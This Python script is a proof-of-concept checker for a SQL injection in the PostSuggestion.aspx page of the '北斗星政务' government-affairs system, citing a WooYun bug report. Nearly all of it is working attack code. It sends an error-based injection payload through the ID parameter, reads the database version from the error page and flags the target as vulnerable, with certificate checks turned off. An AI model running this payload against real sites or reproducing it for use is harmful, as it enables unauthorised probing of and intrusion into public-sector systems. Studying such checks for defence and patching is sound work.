#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 北斗星政务PostSuggestion.aspx SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-076739
author: Lucifer
description: /sssweb/SuggestionCollection/PostSuggestion.aspx ID参数存在SQL注入。
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class star_PostSuggestion_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/sssweb/SuggestionCollection/PostSuggestion.aspx?ID=1%27AnD+1=char(73)%2Bchar(73)%2Bchar(73)%2B@@version--"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code==500 and r"IIIMicrosoft" in req.text:
                printGreen("[+]Success:存在北斗星政务PostSuggestion.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在star_PostSuggestion_sqli漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = star_PostSuggestion_sqli(sys.argv[1])
    testVuln.run()